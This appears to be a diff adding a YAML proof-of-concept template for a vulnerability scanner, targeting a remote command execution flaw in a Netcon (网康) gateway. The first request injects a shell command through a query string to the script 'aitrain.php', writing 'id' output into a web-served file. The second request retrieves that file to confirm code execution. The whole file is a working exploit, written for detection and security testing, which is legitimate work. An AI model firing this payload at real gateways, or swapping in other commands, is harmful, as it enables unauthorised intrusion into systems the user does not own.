@@ -1,0 +1,23 @@
+id: poc-yaml-wangkang-gateway-rce
+info:
+  name: 网康网关远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 网康
+  osprey-id: vb_2022_0089
+variables:
+  r1: random_str(6)
+requests:
+- method: GET
+  path: /scripts/aitrain.php?1+delete+test;id>../css/{{.r1}};
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /css/{{.r1}}
+  expression: 'status_code == 200 && contains(body, "uid=") && contains(body, "gid=")
+    && !contains(body, "<") && contains(body, "groups")
+
+    '
+transport: http
